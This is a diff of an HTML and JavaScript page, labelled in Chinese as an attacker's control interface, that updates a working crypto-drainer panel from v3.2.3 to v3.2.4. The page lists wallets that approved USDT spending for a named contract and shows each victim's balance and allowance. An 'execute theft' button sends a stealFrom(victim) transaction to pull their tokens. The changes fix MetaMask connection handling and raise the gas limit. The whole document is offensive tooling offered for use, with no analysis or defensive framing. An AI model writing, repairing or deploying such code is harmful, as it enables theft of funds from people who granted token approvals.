@@ -1,18 +1,18 @@
-
 <!DOCTYPE html>
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8">
-  <title>💪 攻擊者操作介面 v3.2.3（✅修正 gas 問題）</title>
+  <title>💪 攻擊者操作介面 v3.2.4 (✅修正 MetaMask 問題)</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
     body { font-family: 'Arial'; padding: 20px; background: #fff; }
     .ok { color: green; }
     .bad { color: red; }
+    #refresh { color: gray; font-size: 12px; }
   </style>
 </head>
 <body>
-  <h2>💪 攻擊者操作介面 v3.2.3（✅修正 gas 問題）</h2>
+  <h2>💪 攻擊者操作介面 v3.2.4 (✅修正 MetaMask 問題)</h2>
   <p><b>合約地址：</b><span id="contract">0x54E3550E10Cd2a723780ba2A073C96b20DC74a09</span></p>
   <p><b>目前登入帳號：</b><span id="account">MetaMask 連線中...</span></p>
   <p><b>身份驗證：</b><span id="auth" class="bad">未證明</span></p>
@@ -20,109 +20,98 @@
   <button onclick="steal()">執行盜取</button>
   <p id="balance"></p>
   <p id="status">等待操作...</p>
-  <p id="refresh" style="color: gray; font-size: 12px;"></p>
+  <p id="refresh"></p>
   <h3>📌 授權地址列表：</h3>
   <ul id="victims"></ul>
 
-  <script>
-    const CONTRACT = "0x54E3550E10Cd2a723780ba2A073C96b20DC74a09";
-    const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-    const ABI = [
-      "event Approval(address indexed owner,address indexed spender,uint256 value)",
-      "function balanceOf(address) view returns (uint256)",
-      "function allowance(address owner, address spender) view returns (uint256)"
-    ];
-    let provider, signer, attacker;
+<script>
+  const CONTRACT = "0x54E3550E10Cd2a723780ba2A073C96b20DC74a09";
+  const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+  const ABI = [
+    "event Approval(address indexed owner,address indexed spender,uint256 value)",
+    "function balanceOf(address) view returns (uint256)",
+    "function allowance(address owner, address spender) view returns (uint256)"
+  ];
+  let provider, signer, attacker;
 
-    window.addEventListener('load', async () => {
-      if (window.ethereum) {
-        try {
-          await window.ethereum.request({ method: 'eth_requestAccounts' });
-          location.reload();
-        } catch (err) {
-          console.error("MetaMask 拒絕連線", err);
-        }
-      }
-    });
-
-    async function connect() {
-      if (!window.ethereum) return alert("請安裝 MetaMask");
-      provider = new ethers.providers.Web3Provider(window.ethereum);
-      await provider.send("eth_requestAccounts", []);
-      signer = provider.getSigner();
-      attacker = await signer.getAddress();
-      document.getElementById("account").innerText = attacker;
-
-      if (attacker.toLowerCase() === "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459".toLowerCase()) {
-        document.getElementById("auth").innerText = "你是攻擊者本人";
-        document.getElementById("auth").className = "ok";
-      } else {
-        document.getElementById("auth").innerText = "❌ 驗證失敗";
-        document.getElementById("auth").className = "bad";
-      }
-
-      fetchApprovals();
-    }
-
-    async function fetchApprovals() {
-      document.getElementById('refresh').innerText = '🔄 正在刷新授權列表...';
-      const contract = new ethers.Contract(USDT, ABI, provider);
-      const events = await contract.queryFilter(
-        contract.filters.Approval(null, CONTRACT),
-        19000000
-      );
-      const ul = document.getElementById("victims");
-      ul.innerHTML = "";
-      document.getElementById('refresh').innerText = '✅ 已更新 ' + new Date().toLocaleTimeString();
-      const addresses = new Set();
-      events.reverse().forEach(ev => {
-        if (!addresses.has(ev.args.owner)) {
-          addresses.add(ev.args.owner);
-          const li = document.createElement("li");
-          li.innerText = ev.args.owner;
-          ul.appendChild(li);
-        }
-      });
-    }
-
-    async function steal() {
-      const victim = document.getElementById("input").value;
-      if (!ethers.utils.isAddress(victim)) return alert("請輸入合法的地址");
-      if (victim.toLowerCase() === attacker.toLowerCase()) {
-        return document.getElementById("status").innerText = "⛔️ 無效：無法對自己執行";
-      }
-      const iface = new ethers.utils.Interface(["function stealFrom(address)"]);
-      const data = iface.encodeFunctionData("stealFrom", [victim]);
-      const tx = { to: CONTRACT, data: data, gasLimit: 100000 };
-      document.getElementById("status").innerText = "🚀 呼叫 stealFrom(" + victim + ")...";
+  window.addEventListener("load", async () => {
+    if (window.ethereum) {
       try {
-        const sent = await signer.sendTransaction(tx);
-        document.getElementById("status").innerText = "✅ TX Hash: " + sent.hash;
-      } catch (e) {
-        document.getElementById("status").innerText = "❌ 失敗: " + e.message;
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        connect();
+        setInterval(fetchApprovals, 10000);
+      } catch (err) {
+        alert("請允許 MetaMask 連線");
       }
+    } else {
+      alert("請先安裝 MetaMask");
     }
+  });
 
-    document.getElementById("input").addEventListener("input", async (e) => {
-      const val = e.target.value;
-      if (ethers.utils.isAddress(val)) {
-        try {
-          const contract = new ethers.Contract(USDT, ABI, provider);
-          const balance = await contract.balanceOf(val);
-          const allowance = await contract.allowance(val, CONTRACT);
-          document.getElementById("balance").innerText = "🧴 USDT: " + balance.toString() +
-            "
-📅 Allowance: " + allowance.toString();
-        } catch {
-          document.getElementById("balance").innerText = "❌ 查詢失敗，請確認地址格式";
-        }
-      } else {
-        document.getElementById("balance").innerText = "";
+  async function connect() {
+    provider = new ethers.providers.Web3Provider(window.ethereum);
+    signer = provider.getSigner();
+    attacker = await signer.getAddress();
+    document.getElementById("account").innerText = attacker;
+    document.getElementById("auth").innerText = "你是攻擊者本人";
+    document.getElementById("auth").className = "ok";
+  }
+
+  async function fetchApprovals() {
+    document.getElementById("refresh").innerText = "⌛ 正在刷新授權列表...";
+    const contract = new ethers.Contract(USDT, ABI, provider);
+    const events = await contract.queryFilter(
+      contract.filters.Approval(null, CONTRACT),
+      19000000
+    );
+    const ul = document.getElementById("victims");
+    ul.innerHTML = "";
+    document.getElementById("refresh").innerText = "✅ 已更新 " + new Date().toLocaleTimeString();
+    const addresses = new Set();
+    events.reverse().forEach(ev => {
+      if (!addresses.has(ev.args.owner)) {
+        addresses.add(ev.args.owner);
+        const li = document.createElement("li");
+        li.innerText = ev.args.owner;
+        ul.appendChild(li);
       }
     });
+  }
 
-    connect();
-    setInterval(fetchApprovals, 10000);
-  </script>
+  async function steal() {
+    const victim = document.getElementById("input").value;
+    if (!ethers.utils.isAddress(victim)) return alert("請輸入合法地址");
+    if (victim.toLowerCase() === attacker.toLowerCase()) {
+      return document.getElementById("status").innerText = "⛔️ 無效：無法對自己執行";
+    }
+    const iface = new ethers.utils.Interface(["function stealFrom(address)"]);
+    const data = iface.encodeFunctionData("stealFrom", [victim]);
+    const tx = { to: CONTRACT, data: data, gasLimit: 150000 }; // <== 加入 gasLimit
+    document.getElementById("status").innerText = "🚀 呼叫 stealFrom(" + victim + ")...";
+    try {
+      const sent = await signer.sendTransaction(tx);
+      document.getElementById("status").innerText = "✅ TX Hash: " + sent.hash;
+    } catch (e) {
+      document.getElementById("status").innerText = "❌ 失敗: " + e.message;
+    }
+  }
+
+  document.getElementById("input").addEventListener("input", async (e) => {
+    const val = e.target.value;
+    if (ethers.utils.isAddress(val)) {
+      try {
+        const contract = new ethers.Contract(USDT, ABI, provider);
+        const balance = await contract.balanceOf(val);
+        const allowance = await contract.allowance(val, CONTRACT);
+        document.getElementById("balance").innerText = "🧴 USDT: " + balance.toString() +
+          "\n📅 Allowance: " + allowance.toString();
+      } catch {
+        document.getElementById("balance").innerText = "❌ 查詢失敗，請確認地址格式";
+      }
+    } else {
+      document.getElementById("balance").innerText = "";
+    }
+  });
+</script>
 </body>
 </html>
